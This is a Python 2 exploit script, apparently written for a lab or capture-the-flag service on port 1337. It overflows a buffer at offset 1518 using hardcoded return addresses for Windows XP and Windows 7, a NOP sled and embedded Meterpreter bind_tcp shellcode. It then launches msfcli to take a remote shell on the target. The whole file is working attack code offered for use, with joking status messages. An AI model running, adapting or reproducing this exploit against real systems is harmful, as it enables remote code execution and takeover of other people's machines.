#!/usr/bin/env python

import os
import sys
import time
import socket

if len(sys.argv) == 1:
	print '\texploit.py <rhost>'
	sys.exit()

# Gotta have colors!
W = "\033[0m"  # default/white
O = "\033[33m" # orange
C = "\033[36m" # cyan
bold = "\033[1m"

rhost = sys.argv[1]
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sys.stdout.write(bold+C+' [*] '+W+"Attempting to connect to %s..." % rhost)
sys.stdout.flush()
s.connect((rhost, 1337))
s.recv(1024)
s.sendall(("A" * 500) + "\r\n")
s.recv(1024)
sys.stdout.write('ok\n')

# Meterpreter bind tcp stager code
meterpreter = "\xbb\xe0\x93\x8f\xa4\xdd\xc6\xd9\x74\x24\xf4\x5a\x33\xc9" + \
"\xb1\x4b\x31\x5a\x14\x03\x5a\x14\x83\xc2\x04\x02\x66\x73" + \
"\x4c\x4b\x89\x8c\x8d\x2b\x03\x69\xbc\x79\x77\xf9\xed\x4d" + \
"\xf3\xaf\x1d\x26\x51\x44\x95\x4a\x7e\x6b\x1e\xe0\x58\x42" + \
"\x9f\xc5\x64\x08\x63\x44\x19\x53\xb0\xa6\x20\x9c\xc5\xa7" + \
"\x65\xc1\x26\xf5\x3e\x8d\x95\xe9\x4b\xd3\x25\x08\x9c\x5f" + \
"\x15\x72\x99\xa0\xe2\xc8\xa0\xf0\x5b\x47\xea\xe8\xd0\x0f" + \
"\xcb\x09\x34\x4c\x37\x43\x31\xa6\xc3\x52\x93\xf7\x2c\x65" + \
"\xdb\x5b\x13\x49\xd6\xa2\x53\x6e\x09\xd1\xaf\x8c\xb4\xe1" + \
"\x6b\xee\x62\x64\x6e\x48\xe0\xde\x4a\x68\x25\xb8\x19\x66" + \
"\x82\xcf\x46\x6b\x15\x1c\xfd\x97\x9e\xa3\xd2\x11\xe4\x87" + \
"\xf6\x7a\xbe\xa6\xaf\x26\x11\xd7\xb0\x8f\xce\x7d\xba\x22" + \
"\x1a\x07\xe1\x2a\xef\x35\x1a\xab\x67\x4e\x69\x99\x28\xe4" + \
"\xe5\x91\xa1\x22\xf1\xd6\x9b\x92\x6d\x29\x24\xe2\xa4\xee" + \
"\x70\xb2\xde\xc7\xf8\x59\x1f\xe7\x2c\xcd\x4f\x47\x9f\xad" + \
"\x3f\x27\x4f\x45\x2a\xa8\xb0\x75\x55\x62\xd9\x44\x71\xde" + \
"\x8e\xa4\x85\xf0\x12\x21\x63\x98\xba\x67\x3b\x35\x79\x5c" + \
"\xf4\xa2\x82\xb7\xa8\x7b\x15\x80\xa6\xbc\x1a\x11\xed\xee" + \
"\xb7\xba\x66\x65\xd4\x7f\x96\x7a\xf1\x28\xcf\xed\x8f\xb8" + \
"\xa2\x8c\x90\x91\x57\x4f\x05\x1d\xfe\x18\xb1\x1f\x27\x6e" + \
"\x1e\xe0\x02\xe4\x97\x74\xed\x93\xd7\x98\xed\x63\x8e\xf2" + \
"\xed\x0b\x76\xa6\xbd\x2e\x79\x73\xd2\xe2\xec\x7b\x83\x57" + \
"\xa6\x13\x29\x81\x80\xbc\xd2\xe4\x10\x81\x04\xc1\x96\xf3" + \
"\x22\x21\x5b"

# Windows 7 - 74967bef - kernel32.dll
# Windows XP - 0x7e4924bc - USER32.dll
print " *** Select target *** \n  1. Windows XP\n  2. Windows 7"
target = raw_input(" Select: ")
if target == "1":
	eip = '\xbc\x24\x49\x7e'
else:
	eip = '\xef\x7b\x96\x74'

# Build attack string
nops = '\x90' * 50
offset = 1518
attack = "THE_PWN_TRAIN_GOES_CHOO_CHOO"
while len(attack) < offset:
	attack += "O"
attack += eip
attack += nops
attack += meterpreter

print bold+C+" [*] "+W+"Sending %d evil bytes" % len(attack)
s.sendall(attack + "\r\n")
s.close()
print bold+C+" [*] "+W+"I gave that server authentication, servers love authentication"
print bold+O+" [$] "+W+"Dropp'in a shell :P"
os.system("sudo msfcli exploit/multi/handler RHOST=%s PAYLOAD=windows/meterpreter/bind_tcp E" % rhost)
